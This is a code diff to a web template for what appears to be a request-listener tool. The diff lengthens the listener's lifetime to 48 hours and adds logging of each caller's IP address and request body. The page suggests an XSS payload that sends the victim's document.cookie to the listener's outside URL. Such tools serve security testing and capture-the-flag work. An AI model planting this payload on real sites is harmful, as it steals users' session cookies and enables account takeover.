@@ -8,8 +8,8 @@ block content
 	p Listening to requests at&nbsp;
 		a(href=(global.path.join('/l/', id, '/')))=(global.path.join('/l/', id, '/'))
 	p Listener expires at:&nbsp;
-		span.formatDate=(data.createdAt + 1000*60*60)
-	p Try this as an xss: 
+		span.formatDate=(data.createdAt.getTime() + 1000*60*60*48)
+	p Try this as an XSS: 
 		- var str = '<script>window.location.href = "//weastie.com/l/' + id + '/" + encodeURIComponent(document.cookie)</script>'
 		| #{str}
 	hr
@@ -22,7 +22,9 @@ block content
 			each req in data.requests
 				p Request at:&nbsp;
 					span.formatDate=req.date
+				p IP Address: #{req.ip}
 				p #{req.method}: #{decodeURIComponent(req.path)}
+				p Body: #{JSON.stringify(req.body)}
 				p.
 					=============
 		else
